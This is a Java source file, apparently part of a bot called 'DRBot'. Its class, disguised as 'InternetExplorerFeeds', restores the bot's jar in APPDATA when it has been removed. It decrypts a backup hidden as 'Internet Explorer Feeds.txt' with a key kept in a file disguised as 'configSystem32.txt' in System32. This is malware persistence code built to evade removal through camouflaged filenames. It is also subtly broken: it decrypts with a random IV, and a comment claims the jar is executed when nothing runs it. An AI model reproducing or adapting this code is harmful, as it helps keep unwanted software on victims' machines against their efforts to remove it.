package com.DRBot.BackUp;

import java.io.File;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import java.security.Key;
import javax.crypto.spec.IvParameterSpec;
import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;


/**
 *
 * @author MerNat
 */
public class InternetExplorerFeeds {

    private static File myFile,myBackUp,myDecJar;
    private static String myPath,edMyPath;
    private static Cipher myCipher;
    private static CipherOutputStream cipherOutput;
    private static Key myKey;
    private static ObjectInputStream obKey;
    private static FileInputStream myFileStream;
    private static FileOutputStream myNewFileStream;
    private static byte[] myByte;
    
    public static void main(String args[])throws Exception{
        myPath = System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ");
        myFile = new File(myPath+"\\DRBot.jar");  // i just leave this line to decide which name complete its meaninig.
        File tempFile = new File(myPath);
        File tempFile2 = tempFile.getParentFile();
        if(!myFile.exists()){
            
            /*decrypt the backup file to jar file and execute it ...
                because when executing the bot, it automatically generate all things in a proper way.
            */
           myBackUp = new File(tempFile2.getPath()+"\\local\\Microsoft\\Internet Explorer Feeds.txt");
           if(!myBackUp.exists()){
               myBackUp = new File(myPath+"\\Microsoft\\Internet Explorer Feeds.txt");
           }

           //get Private Key.
           obKey = new ObjectInputStream(new FileInputStream(new File("C:\\Windows\\System32\\configSystem32.txt")));
           myKey = (Key)obKey.readObject();
           obKey.close();
           
           //get Cipher Object
           myCipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
           
           //generate an IvParameterSeed
           myByte = new byte[8];
           myByte = new SecureRandom().generateSeed(8);
           
           //initialize the decryption method
           myCipher.init(Cipher.DECRYPT_MODE, myKey,new IvParameterSpec(myByte));
           
           //initialize the streams
           myFileStream = new FileInputStream(myBackUp);
           myNewFileStream = new FileOutputStream(myFile);
           
           //decrypt and create the bot.
           cipherOutput = new CipherOutputStream(myNewFileStream,myCipher);
           byte[] buffer = new byte[512];
           int length;
           while((length = myFileStream.read(buffer))>=0){
               cipherOutput.write(buffer,0,length);
           }
           myFileStream.close();
           cipherOutput.close();
                   
        }
    }
}
